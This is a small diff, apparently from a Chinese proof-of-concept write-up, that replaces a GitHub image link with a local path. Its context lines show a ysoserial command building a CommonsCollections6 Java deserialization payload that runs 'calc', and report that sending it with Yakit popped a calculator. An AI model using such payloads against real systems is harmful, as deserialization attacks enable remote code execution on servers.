@@ -28,4 +28,4 @@ java -jar ysoserial.jar CommonsCollections6 "calc" > 1.txt
 
 使用yakit发包，成功弹出计算器
 
-![image](https://github.com/wy876/POC/assets/139549762/21dfbaab-7687-45b4-b171-722aad3e759b)
+![image](../../images/21dfbaab-7687-45b4-b171-722aad3e759b.png)
